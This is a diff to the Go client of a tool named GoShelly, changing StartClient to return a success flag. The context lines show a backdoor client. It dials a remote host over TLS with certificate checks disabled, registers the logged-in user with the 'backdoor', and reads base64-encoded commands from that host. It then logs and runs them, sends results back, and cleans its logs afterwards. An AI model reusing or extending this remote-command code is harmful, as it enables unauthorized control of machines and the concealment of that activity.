@@ -354,7 +354,7 @@ func SaveLoginResult(resp *http.Response, email string) {
 	}
 }
 
-func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
+func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) bool {
 	fmt.Println("Running GoShelly")
 	CONFIG.HOST = HOST
 	CONFIG.PORT = PORT
@@ -375,7 +375,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	cert, err := tls.LoadX509KeyPair("certs/client.pem", "certs/client.key")
 	if err != nil {
 		CONFIG.CLIENTLOG.Println("Could not load SSL Certificate. Exiting...")
-		return
+		return  false
 	}
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	conn := dialReDial(CONFIG.HOST+":"+CONFIG.PORT, &config)
@@ -383,7 +383,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	user := GetLoggedUser()
 	if (user == t.LoggedUser{}){
 		fmt.Println("No existing user.")
-		return 
+		return  false
 	}
 	introduceUserToBackdoor(conn,user )
 	num := readCmdLen(conn)
@@ -394,7 +394,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		_, err := conn.Read(buffer)
 		if err != nil {
 			CONFIG.CLIENTLOG.Println("Read Error. Exiting. Internal error or server disconnected. Exiting...")
-			return
+			return  false
 		}
 		sDec, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		CONFIG.CLIENTLOG.Println("\nEXECUTE:\n", string(sDec))
@@ -406,7 +406,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 		_, err = conn.Write([]byte(encodedResp))
 		if err != nil {
 			CONFIG.CLIENTLOG.Println("Write Error. Exiting. Internal error or server disconnected. Exiting...")
-			return
+			return false
 		}
 		time.Sleep(time.Second)
 		buffer = nil
@@ -415,6 +415,7 @@ func StartClient(HOST string, PORT string, SSLEMAIL string, logmax int) {
 	CONFIG.CLIENTLOG.Println("All commands ran successfully. Returning exit success.")
 	logClean("./logs/")
 	fmt.Printf("Exit Success.\nReturning Log.\n\n")
+	return true
 	// returnLog()
 }
 
